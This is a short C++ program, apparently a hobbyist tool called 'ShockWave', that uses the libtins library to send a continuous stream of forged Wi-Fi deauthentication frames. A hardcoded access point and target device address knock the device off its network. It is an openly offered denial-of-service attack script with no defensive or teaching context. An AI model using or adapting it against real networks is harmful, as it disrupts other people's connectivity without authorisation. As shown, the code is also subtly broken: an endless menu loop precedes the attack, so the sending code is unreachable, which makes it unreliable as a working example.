#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>

using namespace std;
using namespace Tins;


void showHeader() {
    cout << "-------------------ShockWave---------------" << endl;
    cout << "----------------By Transpalette------------" << endl;
    cout << "--------------Use at your own risk---------" << endl;
    cout << "*******************************************" << endl;
}

void showMenu() {
    system("clear");
    showHeader();
}

int main()
{
    while(true) {
        showMenu();
        usleep(100000);
    }

    PacketSender sender;
    HWAddress<6> bssid("8E:90:6A:3D:74:3C");

    cout << "-> BSSID: " << bssid << endl;

    HWAddress<6> target("10:66:75:48:f1:98");

    cout << "-> Target: " << target << endl;

    Dot11Deauthentication deauth = Dot11Deauthentication(target, bssid); //Set target / sender
    deauth.addr3(bssid); //Set the BSSID
    deauth.reason_code(0x0007);
    RadioTap radio = RadioTap() / deauth;

    cout << "Deauthenticating... (ctrl+c to stop)" << endl;

    while (true) {
        sender.send(radio, "wlp2s0");
        usleep(1000000);
    }

    return 0;
}


